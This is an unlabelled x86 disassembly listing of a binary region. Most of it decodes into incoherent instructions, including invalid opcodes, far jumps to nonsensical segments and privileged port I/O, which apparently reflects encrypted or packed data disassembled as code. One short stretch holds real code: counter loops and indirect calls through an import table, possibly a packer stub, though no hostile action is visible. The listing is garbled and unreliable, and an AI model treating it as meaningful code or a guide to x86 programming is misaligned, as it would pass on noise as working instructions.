  418eaf:	mov    esi,0xd2af996d
  418eb4:	mov    ch,0x52
  418eb6:	arpl   WORD PTR [ebx-0x7e97cc35],ax
  418ebc:	jle    0x418e82
  418ebe:	sahf   
  418ebf:	jl     0x418f2b
  418ec1:	fsub   DWORD PTR [edi-0x6eb1fcea]
  418ec7:	ret    
  418ec8:	clc    
  418ec9:	push   eax
  418eca:	mov    dh,0xc1
  418ecc:	lods   al,BYTE PTR ds:[esi]
  418ecd:	mov    BYTE PTR [esi+0x7b55b92f],ah
  418ed3:	jbe    0x418f20
  418ed5:	sub    BYTE PTR [edi],dh
  418ed7:	xchg   edi,eax
  418ed8:	stc    
  418ed9:	popa   
  418eda:	or     dl,BYTE PTR [ecx-0x25302add]
  418ee0:	dec    esp
  418ee1:	call   0x732f3a15
  418ee6:	jmp    0x418f24
  418ee8:	scas   al,BYTE PTR es:[edi]
  418ee9:	cmp    eax,0xffad2f47
  418eee:	stc    
  418eef:	or     edx,DWORD PTR [eax]
  418ef1:	out    dx,eax
  418ef2:	cli    
  418ef3:	sub    al,0xc3
  418ef5:	aas    
  418ef6:	xor    al,0x75
  418ef8:	arpl   WORD PTR [eiz*4+0x23f20898],si
  418eff:	(bad)  
  418f00:	mov    bh,0xc6
  418f02:	aaa    
  418f03:	sub    DWORD PTR [edi+ebx*8-0x65],esi
  418f07:	xor    esi,esi
  418f09:	jl     0x418f65
  418f0b:	inc    ebp
  418f0c:	mov    ah,0x64
  418f0e:	(bad)  
  418f0f:	scas   al,BYTE PTR es:[edi]
  418f10:	cs adc BYTE PTR cs:[edx+eax*1-0x6b],cl
  418f16:	sahf   
  418f17:	ret    0xaee2
  418f1a:	sub    eax,0x64b59e3
  418f1f:	das    
  418f20:	ja     0x418ee2
  418f22:	cld    
  418f23:	mov    esi,0xc6bf54b7
  418f28:	fs mov edi,0x93df4e40
  418f2e:	cmp    DWORD PTR [esp+eiz*4],ecx
  418f31:	xor    eax,0xa3b4af2b
  418f36:	sbb    eax,0x9c6e5779
  418f3b:	push   ebx
  418f3c:	mov    esi,0x9de3d718
  418f41:	mov    ebx,0x77f73866
  418f46:	or     DWORD PTR ss:[esi-0x25],ecx
  418f4a:	add    BYTE PTR [edx-0x3a],dh
  418f4d:	adc    eax,0xa35840d8
  418f52:	stc    
  418f53:	aas    
  418f54:	mov    dh,0xac
  418f56:	pop    esi
  418f57:	push   0xffffffbd
  418f59:	cmp    ah,BYTE PTR [ebp-0x74]
  418f5c:	mov    ah,0xe5
  418f5e:	popa   
  418f5f:	mov    ecx,0x9cbf5692
  418f64:	out    0x3,eax
  418f66:	or     ebx,DWORD PTR [ebx]
  418f68:	jb     0x418f6e
  418f6a:	in     al,0x75
  418f6c:	sti    
  418f6d:	mov    ebp,0x81b4b4c4
  418f72:	ficomp DWORD PTR [eax]
  418f74:	or     BYTE PTR [eax+0x32d1c070],bh
  418f7a:	jg     0x418fa4
  418f7c:	sub    BYTE PTR [ebx],dl
  418f7e:	pusha  
  418f7f:	mov    esp,esp
  418f81:	lods   al,BYTE PTR ds:[esi]
  418f82:	cdq    
  418f83:	fldenv ds:[edi+edx*1]
  418f87:	das    
  418f88:	cdq    
  418f89:	or     ebx,edx
  418f8b:	gs mov cl,0x3c
  418f8e:	popa   
  418f8f:	das    
  418f90:	jnp    0x418f3c
  418f92:	in     al,0x7a
  418f94:	pop    es
  418f95:	fnstcw WORD PTR [ebp+0x4c4eca30]
  418f9b:	add    ebx,DWORD PTR [esi+0x5]
  418f9e:	push   esi
  418f9f:	fldenv [edx]
  418fa1:	mov    eax,ds:0x5f8cba40
  418fa6:	dec    ecx
  418fa7:	mov    bh,BYTE PTR [ecx-0x5eab70e0]
  418fad:	(bad)  
  418fae:	mov    eax,0x92fd162a
  418fb3:	jmp    0x8b38:0x86debf0c
  418fba:	sahf   
  418fbb:	jmp    0x418fbd
  418fbd:	push   ecx
  418fbe:	add    dl,ch
  418fc0:	test   dl,0xaa
  418fc3:	mov    ebx,0x7ada9d40
  418fc8:	xor    cl,dl
  418fca:	nop
  418fcb:	shl    BYTE PTR [eax+0x65],cl
  418fce:	fmul   QWORD PTR [edi]
  418fd0:	fwait
  418fd1:	nop
  418fd2:	imul   ecx,edx,0x2a
  418fd5:	sbb    ecx,ebx
  418fd7:	mov    WORD PTR [esi],ss
  418fd9:	cdq    
  418fda:	mov    eax,0xcb453702
  418fdf:	mov    al,0x5b
  418fe1:	push   cs
  418fe2:	mov    dl,0x46
  418fe5:	aas    
  418fe6:	(bad)  
  418fe8:	(bad)  
  418fe9:	cs pop esp
  418feb:	call   0x538f:0xdb4e86f5
  418ff2:	pop    ds
  418ff3:	adc    BYTE PTR [edi-0x3e226d8c],ah
  418ff9:	retf   
  418ffa:	dec    eax
  418ffb:	jle    0x41906f
  418ffd:	sub    ebx,esi
  418fff:	dec    DWORD PTR [ebp+0x26]
  419002:	inc    ecx
  419003:	sub    BYTE PTR [edi+0x43],cl
  419006:	imul   edx
  419008:	inc    eax
  419009:	sahf   
  41900a:	push   ecx
  41900b:	inc    edi
  41900c:	sbb    DWORD PTR [ebx-0x4b],0xffffffa5
  419010:	imul   edi,DWORD PTR [ebx+0x41],0xc5cbb97c
  419017:	aaa    
  419018:	stos   BYTE PTR es:[edi],al
  419019:	mov    ecx,0x5194b766
  41901e:	ret    
  41901f:	inc    ebx
  419020:	jle    0x418ff0
  419022:	fs mov ebp,0x6295552b
  419028:	loopne 0x41904b
  41902a:	inc    eax
  41902b:	aas    
  41902c:	xor    eax,0x22c55d51
  419031:	inc    eax
  419032:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419033:	cmp    BYTE PTR [ecx-0x3d],0x54
  419037:	sbb    esi,DWORD PTR [ecx-0x20]
  41903a:	push   esi
  41903b:	pop    ebx
  41903c:	fidiv  DWORD PTR [ebp+0x75]
  41903f:	jno    0x418fec
  419041:	pop    ebx
  419042:	xlat   BYTE PTR ds:[ebx]
  419043:	cld    
  419044:	mov    dh,0x18
  419046:	add    esp,ecx
  419048:	loope  0x418fdd
  41904a:	(bad)  
  41904b:	adc    ebx,DWORD PTR [ebx+0x36e79f3e]
  419051:	inc    eax
  419052:	out    0x2,al
  419054:	repnz repnz xchg edx,eax
  419057:	mov    bl,0xdf
  419059:	sub    dl,bl
  41905b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41905c:	dec    edx
  41905d:	mov    edi,0xaff1a4cd
  419062:	popf   
  419063:	mov    eax,ds:0x6d55c61e
  419068:	jmp    0x23f5:0x17d744b
  41906f:	mov    bh,0xc4
  419071:	ds pop ecx
  419073:	push   eax
  419074:	fsubr  DWORD PTR [ebx-0x63ad6856]
  41907a:	cdq    
  41907b:	pop    esi
  41907c:	cmc    
  41907d:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41907f:	or     al,0xb4
  419081:	sbb    al,0xe5
  419083:	mov    al,ds:0xdcbb9002
  419088:	fwait
  419089:	add    eax,0x852cab7a
  41908e:	xchg   bh,ch
  419090:	(bad)  
  419091:	lods   al,BYTE PTR ds:[esi]
  419092:	ret    
  419093:	ss jle 0x419078
  419096:	xor    eax,0xcf234fb7
  41909b:	je     0x41906b
  41909d:	and    BYTE PTR [ecx-0x37deda37],0x62
  4190a4:	int    0xcd
  4190a6:	sbb    esi,DWORD PTR [ebx]
  4190a8:	dec    ecx
  4190a9:	jle    0x41911c
  4190ab:	jg     0x4190ef
  4190ad:	add    ecx,DWORD PTR [eax]
  4190af:	adc    eax,DWORD PTR [ebp-0x74]
  4190b2:	dec    ebx
  4190b3:	mov    ecx,0xdea485a8
  4190b8:	cmc    
  4190b9:	jae    0x4190a7
  4190bb:	dec    BYTE PTR [edx-0x24]
  4190be:	cmp    ecx,ecx
  4190c0:	pop    esp
  4190c1:	and    ebp,DWORD PTR [esi-0x3a]
  4190c4:	lods   eax,DWORD PTR ds:[esi]
  4190c5:	(bad)  
  4190c6:	(bad)  
  4190c7:	out    0xb6,eax
  4190c9:	cli    
  4190ca:	hlt    
  4190cb:	adc    dh,BYTE PTR [ecx-0x451e2402]
  4190d1:	mov    dh,0x85
  4190d3:	loope  0x4190a6
  4190d5:	les    edx,FWORD PTR [edx-0x7e4b41cd]
  4190db:	mov    ah,0x91
  4190dd:	and    DWORD PTR [ebx-0x135094c1],edx
  4190e3:	leave  
  4190e4:	cmc    
  4190e5:	or     bl,BYTE PTR [esi+0x6be1d191]
  4190eb:	es or  bh,ah
  4190ee:	push   eax
  4190ef:	call   0x52c2:0x9d31879
  4190f6:	jns    0x41909b
  4190f8:	jmp    0x419154
  4190fa:	inc    edi
  4190fb:	mov    dl,0xb0
  4190fd:	inc    esp
  4190fe:	add    ch,BYTE PTR [ebx+eiz*4-0x58]
  419102:	mov    edi,0xa12db717
  419107:	push   esi
  419108:	mov    ?,edx
  41910a:	push   esp
  41910b:	outs   dx,BYTE PTR ds:[esi]
  41910c:	push   0xffffffc3
  41910e:	pop    ebx
  41910f:	rcl    edx,cl
  419111:	jno    0x419101
  419113:	pop    ebx
  419114:	jb     0x419111
  419116:	lods   eax,DWORD PTR ds:[esi]
  419117:	lods   eax,DWORD PTR ds:[esi]
  419118:	adc    ecx,ecx
  41911a:	std    
  41911b:	pop    ds
  41911c:	retf   0x2a3e
  41911f:	jo     0x4190a3
  419121:	pusha  
  419122:	rcr    DWORD PTR [edi+0x6c],cl
  419125:	fwait
  419126:	jmp    0x3420:0x5acefca2
  41912d:	aas    
  41912e:	mov    al,ds:0xa96d9282
  419133:	adc    esp,eax
  419135:	fcom   DWORD PTR [edi]
  419137:	xchg   ebx,eax
  419138:	ror    ch,0x40
  41913b:	cmp    eax,0xa065b5c6
  419140:	lock sub ebx,eax
  419143:	and    BYTE PTR ds:0x6b4c6d81,al
  419149:	mov    ecx,0xc60ac87b
  41914e:	inc    ecx
  41914f:	mov    esi,0xd61411fb
  419154:	jmp    0xeae8720f
  419159:	xor    bl,BYTE PTR [edx-0x50]
  41915c:	mov    ?,WORD PTR [ebp+0x677feda1]
  419162:	mov    eax,ds:0xde78ce28
  419167:	mov    ch,0x61
  419169:	dec    edx
  41916a:	jb     0x419108
  41916c:	leave  
  41916d:	cs mov dl,0x7a
  419170:	mov    eax,DWORD PTR [edx-0x6ef8e26]
  419176:	sbb    cl,dh
  419178:	sub    BYTE PTR [eax],bh
  41917a:	jmp    0x7ea3:0x756a6946
  419181:	inc    esi
  419182:	clc    
  419183:	out    0xdc,al
  419185:	retf   
  419186:	and    al,0xd3
  419188:	mov    esp,0xe9d0ffd6
  41918d:	add    eax,DWORD PTR [eax]
  41918f:	add    BYTE PTR [eax],al
  419191:	mov    eax,DWORD PTR [ebp+0x10]
  419194:	leave  
  419195:	ret    0xc
  419198:	push   ebp
  419199:	mov    ebp,esp
  41919b:	sub    esp,0x30
  41919e:	jmp    0x4193d3
  4191a3:	rcl    edx,cl
  4191a5:	ret    0xc13e
  4191a8:	into   
  4191a9:	rcl    ecx,cl
  4191ab:	daa    
  4191ac:	jle    0x419228
  4191ae:	mov    gs,WORD PTR [ebx]
  4191b0:	and    eax,0xc5088a4e
  4191b5:	jg     0x41922f
  4191b7:	adc    BYTE PTR [esi+0x78],bh
  4191ba:	js     0x419165
  4191bc:	jno    0x4191b7
  4191be:	test   al,0x5b
  4191c0:	pop    edx
  4191c1:	jge    0x419197
  4191c3:	dec    eax
  4191c4:	jle    0x419232
  4191c6:	jb     0x419191
  4191c8:	bound  ecx,QWORD PTR [ecx-0x488380fc]
  4191ce:	popf   
  4191cf:	xor    DWORD PTR [esi-0x7fb929ac],esp
  4191d5:	xor    al,0x81
  4191d7:	dec    esp
  4191d8:	sbb    BYTE PTR [eax+0x44552ac4],al
  4191de:	aas    
  4191df:	sub    esp,DWORD PTR [esi]
  4191e1:	lea    ecx,[ecx]
  4191e3:	test   BYTE PTR [edx-0x24],ch
  4191e6:	add    al,0x41
  4191e8:	mov    BYTE PTR [edx-0x4e],bl
  4191eb:	sar    DWORD PTR [ecx],cl
  4191ed:	ss dec eax
  4191ef:	les    ecx,FWORD PTR [ebp-0x30]
  4191f2:	fwait
  4191f3:	pusha  
  4191f4:	rcl    BYTE PTR [edx-0x77970926],0x0
  4191fb:	mov    ch,0x3f
  4191fd:	cmp    dl,BYTE PTR [edx+0x4c421025]
  419203:	or     cl,BYTE PTR [esi+0x40]
  419206:	sbb    cl,BYTE PTR [ecx]
  419208:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419209:	loope  0x419237
  41920b:	test   al,ch
  41920d:	or     DWORD PTR [eax-0x1e],edi
  419210:	test   BYTE PTR [edi+ebx*4-0x14],ah
  419214:	cmp    BYTE PTR [ebx-0x67],ah
  419217:	mul    bl
  419219:	gs into 
  41921b:	sub    DWORD PTR [edi],0x77ebf06d
  419221:	mov    ds:0xc6c32879,al
  419226:	test   al,0x58
  419228:	and    DWORD PTR [edi+0x2bdbc38b],edi
  41922e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41922f:	imul   ebp,DWORD PTR [edx+0x51],0xf8c0b472
  419236:	or     eax,0x81f0948f
  41923b:	mov    edi,0x74bc2df7
  419240:	adc    edi,DWORD PTR [ebx-0x4950a2]
  419246:	ins    DWORD PTR es:[edi],dx
  419247:	sub    eax,0xb67e0973
  41924c:	or     BYTE PTR [ebx+0x692c097f],cl
  419252:	cmp    al,0xe3
  419254:	popa   
  419255:	push   0x4302aae
  41925a:	push   eax
  41925b:	stos   BYTE PTR es:[edi],al
  41925c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41925d:	sbb    ch,dh
  41925f:	(bad)  [ebx]
  419261:	adc    al,0x4
  419263:	add    al,BYTE PTR [esi+0x5537e2c3]
  419269:	int3   
  41926a:	or     ecx,DWORD PTR [ebx]
  41926c:	mov    BYTE PTR [ebp-0x56899f0f],ah
  419272:	test   DWORD PTR [edi],edi
  419274:	inc    esi
  419275:	iret   
  419276:	fldcw  WORD PTR [edx-0x12]
  419279:	call   0xc5eb64c7
  41927e:	stos   BYTE PTR es:[edi],al
  41927f:	bound  si,DWORD PTR [esi-0x3bfdc491]
  419286:	enter  0xc63,0xca
  41928a:	pop    edi
  41928b:	out    dx,eax
  41928c:	out    dx,eax
  41928d:	aaa    
  41928e:	sub    DWORD PTR [eax],ebp
  419290:	mov    al,0x66
  419292:	sbb    edi,ecx
  419294:	dec    ebx
  419295:	aam    0x28
  419297:	sub    BYTE PTR [ecx+0x4f448768],al
  41929d:	fsub   QWORD PTR [ebx+0x72]
  4192a0:	add    eax,DWORD PTR [edx+0x2c5bc968]
  4192a6:	pop    ebx
  4192a7:	jno    0x419317
  4192a9:	test   al,0xd2
  4192ab:	aas    
  4192ac:	xor    eax,0x16a30dee
  4192b1:	jl     0x4192cb
  4192b3:	rol    BYTE PTR [eax-0x5f],cl
  4192b6:	xchg   ebp,eax
  4192b7:	sbb    bh,bl
  4192b9:	in     al,dx
  4192ba:	loopne 0x4192a3
  4192bc:	jb     0x419330
  4192be:	es inc edi
  4192c0:	jp     0x419288
  4192c2:	xor    al,0x5f
  4192c4:	sahf   
  4192c5:	dec    esi
  4192c6:	xor    eax,0x52d0b98
  4192cb:	jl     0x4192cd
  4192cd:	(bad)  
  4192ce:	fidivr WORD PTR [esp+ecx*4+0x7129e7f1]
  4192d5:	ficomp WORD PTR [eax+0x53873762]
  4192db:	retf   
  4192dc:	repz in al,dx
  4192de:	mul    BYTE PTR [edi]
  4192e0:	repnz xlat BYTE PTR ds:[ebx]
  4192e2:	lock inc esp
  4192e4:	pushf  
  4192e5:	inc    esi
  4192e6:	add    BYTE PTR [edi],bl
  4192e8:	call   0x995ec734
  4192ed:	mov    ch,0x21
  4192ef:	jecxz  0x41933f
  4192f1:	or     eax,0x6bf3d5cc
  4192f6:	cs jbe 0x41934a
  4192f9:	out    dx,al
  4192fa:	sbb    al,0x59
  4192fc:	sbb    BYTE PTR [ecx+0x1d5fd563],0xe
  419303:	mov    es:0x883ea2c1,al
  419309:	pop    ebp
  41930a:	xchg   ebp,eax
  41930b:	mov    edi,0xbdca7e2d
  419310:	ss jb  0x4192ea
  419313:	mov    ebx,0xd82c68d3
  419318:	mov    ebx,DWORD PTR [ecx+0x70]
  41931b:	cmp    DWORD PTR [edi+0x67fa4556],esp
  419321:	push   0x5b
  419323:	popa   
  419324:	fdivp  st(0),st
  419326:	push   ss
  419327:	dec    ebx
  419328:	stos   BYTE PTR es:[edi],al
  419329:	add    al,0x8c
  41932b:	lods   al,BYTE PTR ds:[esi]
  41932c:	add    eax,0x5dfa2a25
  419331:	enter  0x4cd5,0x75
  419335:	dec    edi
  419336:	fdiv   st(5),st
  419338:	pop    es
  419339:	es (bad) 
  41933b:	push   edi
  41933c:	mov    esp,0x6b86b47f
  419341:	mov    ebp,gs
  419343:	mov    ds:0x8c70649b,eax
  419348:	in     al,0xcb
  41934a:	pushf  
  41934b:	jnp    0x4192de
  41934d:	gs dec ebp
  41934f:	dec    edx
  419350:	test   DWORD PTR [ebx],ecx
  419352:	push   0x784955c0
  419357:	dec    eax
  419358:	inc    eax
  419359:	mov    ds,WORD PTR [ebx+0x62]
  41935c:	pop    es
  41935d:	jnp    0x4192f4
  41935f:	pop    eax
  419360:	push   esp
  419361:	push   esp
  419362:	xor    eax,0xb74d68a9
  419367:	cmp    DWORD PTR [esi-0x32],edx
  41936a:	cmc    
  41936b:	call   0x1670:0x9c57ca2
  419372:	jnp    0x41930c
  419374:	mov    esi,0xf3233f59
  419379:	sbb    BYTE PTR [ecx+0x77],bl
  41937c:	prefetch BYTE PTR [edx+0x70]
  419380:	mov    al,ds:0x42827b55
  419385:	jp     0x419399
  419387:	push   edx
  419388:	cdq    
  419389:	cmc    
  41938a:	pop    edi
  41938b:	inc    ecx
  41938c:	sbb    al,0xef
  41938e:	mov    ds:0x710aa2f9,eax
  419393:	xor    DWORD PTR [ecx+0x6174861],0x95aac132
  41939d:	into   
  41939e:	fs or  eax,0x5a8820c5
  4193a4:	xchg   edi,eax
  4193a5:	push   cs
  4193a6:	adc    DWORD PTR ds:[esi-0x1f40e397],0xffffffc0
  4193ae:	loope  0x419391
  4193b0:	inc    esi
  4193b1:	or     DWORD PTR [edx-0x5e],ebp
  4193b4:	xor    DWORD PTR [ebp+0x545dcdb],esi
  4193ba:	dec    esp
  4193bb:	(bad)  
  4193bd:	mov    ebp,0x10d8e812
  4193c2:	or     eax,0xe47dd2cf
  4193c7:	fcmovnbe st,st(7)
  4193c9:	stos   DWORD PTR es:[edi],eax
  4193ca:	pop    ds
  4193cb:	add    DWORD PTR ds:0x2c36b555,eax
  4193d1:	fcmovnbe st,st(1)
  4193d3:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  4193da:	and    DWORD PTR ds:0x42a89d,0x0
  4193e4:	xor    ecx,ecx
  4193e6:	add    ecx,DWORD PTR ds:0x42a89d
  4193ec:	inc    ecx
  4193ed:	mov    DWORD PTR ds:0x42a89d,ecx
  4193f3:	cmp    DWORD PTR ds:0x42a89d,0x24
  4193fa:	jne    0x41940b
  419400:	push   0x4f45
  419405:	call   DWORD PTR ds:0x41d278
  41940b:	cmp    DWORD PTR ds:0x42a89d,0x1b
  419412:	jb     0x4193e4
  419418:	and    DWORD PTR ds:0x42a821,0x0
  419422:	jmp    0x419434
  419427:	mov    ecx,DWORD PTR ds:0x42a821
  41942d:	inc    ecx
  41942e:	mov    DWORD PTR ds:0x42a821,ecx
  419434:	cmp    DWORD PTR ds:0x42a821,0x1d
  41943b:	jae    0x419470
  419441:	cmp    DWORD PTR ds:0x42a821,0x1e
  419448:	jne    0x419461
  41944e:	push   0x42a9af
  419453:	push   DWORD PTR [ebp-0x20]
  419456:	push   0x1
  419458:	push   DWORD PTR [ebp-0xc]
  41945b:	call   DWORD PTR ds:0x41d118
  419461:	jmp    0x419427
  419466:	adc    DWORD PTR ds:0x42a7d1,0x7c2
  419470:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  419477:	and    DWORD PTR ds:0x42a82d,0x0
  419481:	mov    ecx,DWORD PTR ds:0x42a82d
  419487:	inc    ecx
  419488:	mov    DWORD PTR ds:0x42a82d,ecx
  41948e:	cmp    DWORD PTR ds:0x42a82d,0x25
  419495:	jne    0x4194a6
  41949b:	push   0x42aa68
  4194a0:	call   DWORD PTR ds:0x41d27c
  4194a6:	cmp    DWORD PTR ds:0x42a82d,0x18
  4194ad:	jb     0x419481
  4194b3:	mov    ecx,DWORD PTR [ebp-0x4]
  4194b6:	mov    eax,ds:0x42a825
  4194bb:	and    DWORD PTR ds:0x42a795,eax
  4194c1:	push   ebx
  4194c2:	add    ebx,ebx
  4194c4:	mov    eax,0x7510850
  4194c9:	and    DWORD PTR ds:0x42a78d,ecx
  4194cf:	xor    ecx,eax
  4194d1:	movzx  ebx,BYTE PTR ds:0x42a799
  4194d8:	adc    DWORD PTR ds:0x42a891,ebx
  4194de:	mov    ebx,0x327298
  4194e3:	adc    DWORD PTR ds:0x42a781,0x50ad
  4194ed:	add    ecx,ebx
  4194ef:	inc    DWORD PTR ds:0x42a89d
  4194f5:	mov    DWORD PTR [ebp-0x1c],ecx
  4194f8:	mov    ecx,DWORD PTR [ebp+0x14]
  4194fb:	push   esi
  4194fc:	mov    DWORD PTR ds:0x42a815,0x238f
  419506:	push   edi
  419507:	test   ecx,ecx
  419509:	mov    DWORD PTR ds:0x42a859,0x1f7e
  419513:	je     0x419758
  419519:	jmp    0x41974e
  41951e:	retf   0xd03c
  419521:	(bad)
  419524:	fld    st(3)
  419526:	scas   eax,DWORD PTR es:[edi]
  419527:	inc    eax
  419528:	adc    DWORD PTR [esi-0x4c],eax
  41952b:	push   esp
  41952c:	jp     0x41951e
  41952e:	and    bl,cl
  419530:	jg     0x4195aa
  419532:	adc    BYTE PTR [esi+0x78],bh
  419535:	js     0x4195b3
  419537:	and    eax,0xa25c7e1c
  41953c:	pop    ss
  41953d:	mov    ds,WORD PTR [ebx]
  41953f:	das    
  419540:	inc    eax
  419541:	jno    0x419514
  419543:	imul   esi,DWORD PTR [eax-0x12],0xffffff81
  419547:	cmp    dl,BYTE PTR [eax]
  419549:	xor    al,0xcd
  41954b:	pop    ebp
  41954c:	aaa    
  41954d:	call   0xc78b:0xd8904d1e
  419554:	shr    BYTE PTR ds:0xc34ed283,1
  41955a:	lahf   
  41955b:	sbb    BYTE PTR [edx],cl
  41955d:	cmp    DWORD PTR [ebx-0x33],edi
  419560:	mov    al,ds:0x5a23e7a8
  419565:	aad    0x75
  419567:	xchg   ebx,eax
  419568:	imul   ecx,DWORD PTR [ecx+0x18a82577],0x5a853276
  419572:	sub    eax,0x11888caa
  419577:	mov    eax,ds:0x41a814c3
  41957c:	fld    st(4)
  41957e:	inc    ecx
  41957f:	jg     0x4195bb
  419581:	xchg   ebx,eax
  419582:	mov    ebp,0x2c26cdf1
  419587:	jmp    0x2cbe:0xae7a96fe
  41958e:	cmp    edx,DWORD PTR [edi+0x4e47013b]
  419594:	call   0x19d2:0x4c1bc281
  41959b:	pop    esi
  41959c:	mov    ecx,ds
  41959e:	test   DWORD PTR [edx+ecx*4],0x1895130a
  4195a5:	sub    ch,BYTE PTR [edi]
  4195a7:	call   0x3c79227b
  4195ac:	sub    dh,ah
  4195ae:	mov    bh,ch
  4195b0:	jbe    0x4195cf
  4195b2:	stc    
  4195b3:	popa   
  4195b4:	or     DWORD PTR [edi-0x275b0a1d],0x68
  4195bb:	mov    ebx,0x82c314e9
  4195c0:	fs dec eax
  4195c2:	xchg   edi,eax
  4195c3:	in     eax,0x6d
  4195c5:	scas   eax,DWORD PTR es:[edi]
  4195c6:	nop
  4195c7:	pop    edx
  4195c8:	mov    esp,eax
  4195ca:	test   BYTE PTR [ebp-0x11894929],0x93
  4195d1:	ins    BYTE PTR es:[edi],dx
  4195d2:	jp     0x4195eb
  4195d4:	mov    eax,0x93d4a6cd
  4195d9:	inc    esp
  4195da:	dec    ebp
  4195db:	pop    esi
  4195dc:	xchg   edx,eax
  4195dd:	ja     0x419579
  4195df:	lods   eax,DWORD PTR ds:[esi]
  4195e0:	imul   ebp,DWORD PTR [ebp+0x1e55ec5f],0x53
  4195e7:	ror    BYTE PTR [ebp-0x17e71671],1
  4195ed:	mov    cl,0xd1
  4195ef:	inc    eax
  4195f0:	mov    ah,0x19
  4195f2:	daa    
  4195f3:	sbb    ecx,DWORD PTR [ecx-0x3b]
  4195f6:	xchg   edx,eax
  4195f7:	ret    
  4195f8:	sub    DWORD PTR [edx-0x1b28aa9e],edx
  4195fe:	fimul  WORD PTR [edi-0x1]
  419601:	pop    esi
  419602:	xchg   esp,esp
  419604:	dec    ebx
  419605:	pop    eax
  419606:	jae    0x4195c7
  419608:	clc    
  419609:	out    0x69,al
  41960b:	pop    esi
  41960c:	xchg   ebp,eax
  41960d:	xchg   ebx,edi
  41960f:	mov    gs,WORD PTR [ebp+ebp*8+0x5]
  419613:	and    al,0x11
  419615:	cwde   
  419616:	pop    ebp
  419617:	in     al,dx
  419618:	test   eax,0x177283c6
  41961d:	outs   dx,BYTE PTR ds:[esi]
  41961e:	mov    bl,0xcf
  419620:	scas   al,BYTE PTR es:[edi]
  419621:	ret    0x8de0
  419624:	add    DWORD PTR [ebp+0x132e6575],ebp
  41962a:	call   0xc95cd0fa
  41962f:	xchg   BYTE PTR [esi+0x7d703257],dl
  419635:	mov    ebx,ss
  419637:	mov    ds:0x3c5d7644,eax
  41963c:	jecxz  0x4195d1
  41963e:	ss push ecx
  419640:	sbb    ebx,DWORD PTR [eax-0x3557e923]
  419646:	and    dh,BYTE PTR [eax+edi*8+0x17]
  41964a:	mov    bl,0x99
  41964c:	jecxz  0x41967d
  41964e:	pop    edx
  41964f:	popf   
  419650:	out    0xcc,al
  419652:	aaa    
  419653:	mov    al,ds:0x41b85c2e
  419658:	xchg   esi,eax
  419659:	mov    bl,0xbf
  41965b:	pop    edx
  41965c:	add    BYTE PTR [edi-0x58305ed4],al
  419662:	inc    ebx
  419663:	ror    DWORD PTR [ebx+0x13],cl
  419666:	or     esi,edi
  419668:	sbb    eax,0x5fb32a74
  41966d:	jbe    0x41964a
  41966f:	fld    DWORD PTR [edi+0x103c5549]
  419675:	inc    ebx
  419676:	jbe    0x41963b
  419678:	ds push ss
  41967a:	xchg   edi,eax
  41967b:	push   ds
  41967c:	adc    eax,0x7b1bac9e
  419681:	sub    al,0xa7
  419683:	hlt    
  419684:	test   al,0x9e
  419686:	int3   
  419687:	rol    BYTE PTR [eax-0x7ebcf67b],1
  41968d:	lock jo 0x4196f3
  419690:	(bad)  
  419691:	fisttp DWORD PTR [ebx+0x54921f2b]
  419697:	mov    ds:0x89b51383,al
  41969c:	fwait
  41969d:	js     0x41964a
  41969f:	scas   al,BYTE PTR es:[edi]
  4196a0:	cmp    DWORD PTR [edi+0x1d],ecx
  4196a3:	ja     0x419655
  4196a5:	nop
  4196a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196a7:	cmp    DWORD PTR [edx+0x692e1ed0],esp
  4196ad:	or     edi,esi
  4196af:	inc    ebp
  4196b0:	retf   
  4196b1:	scas   al,BYTE PTR es:[edi]
  4196b2:	push   esp
  4196b3:	xor    esp,0x4910e5c7
  4196b9:	mov    cl,0x20
  4196bb:	push   0xc583cbef
  4196c0:	mov    bh,0x50
  4196c2:	jl     0x4196df
  4196c4:	pushf  
  4196c5:	xor    bl,BYTE PTR [esi-0x25edf14e]
  4196cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196cc:	cdq    
  4196cd:	stos   BYTE PTR es:[edi],al
  4196ce:	ret    
  4196cf:	das    
  4196d0:	jbe    0x41972c
  4196d2:	das    
  4196d3:	or     DWORD PTR [ebp+0x3b],edi
  4196d6:	sub    ch,dh
  4196d8:	repz enter 0x99c5,0x20
  4196dd:	push   es
  4196de:	retf   0xdcbe
  4196e1:	fmul   QWORD PTR [ebx+edi*8]
  4196e4:	dec    edx
  4196e5:	xchg   edx,eax
  4196e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196e7:	retf   
  4196e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196e9:	or     esi,DWORD PTR [ebp-0x7e92c090]
  4196ef:	sahf   
  4196f0:	not    bl
  4196f2:	mov    edi,0xff3321e7
  4196f7:	loope  0x419765
  4196f9:	inc    esi
  4196fa:	xor    eax,0x4676fb2c
  4196ff:	test   DWORD PTR [ebx+0x7b380a04],ebp
  419705:	and    ebp,DWORD PTR [edi]
  419707:	daa    
  419708:	into   
  419709:	or     al,0x1
  41970b:	pushf  
  41970c:	mov    WORD PTR [eax+ecx*4-0x72],ds
  419710:	or     ebx,DWORD PTR [ebx+0x43f1e518]
  419716:	add    ecx,ebp
  419718:	pop    ebp
  419719:	das    
  41971a:	inc    ecx
  41971b:	cmp    esp,DWORD PTR [ecx+esi*1+0x7b3e4b76]
  419722:	mov    bl,0x52
  419724:	fsub   DWORD PTR [ecx+0x23]
  419727:	xlat   BYTE PTR ds:[ebx]
  419728:	cmp    cl,dh
  41972a:	xor    eax,0x2c3d8a04
  41972f:	aas    
  419730:	stc    
  419731:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419732:	lea    ecx,[eax+0x5588123]
  419738:	fsub   QWORD PTR [edx]
  41973a:	into   
  41973b:	icebp  
  41973c:	sbb    eax,0x39a44d7a
  419741:	mov    ecx,0xee2b1a17
  419746:	xor    DWORD PTR [eax+0xeb0aba5],ebp
  41974c:	out    dx,al
  41974d:	push   ebx
  41974e:	mov    ecx,DWORD PTR [ebp+0x14]
  419751:	add    esi,esi
  419753:	mov    ecx,DWORD PTR [ecx]
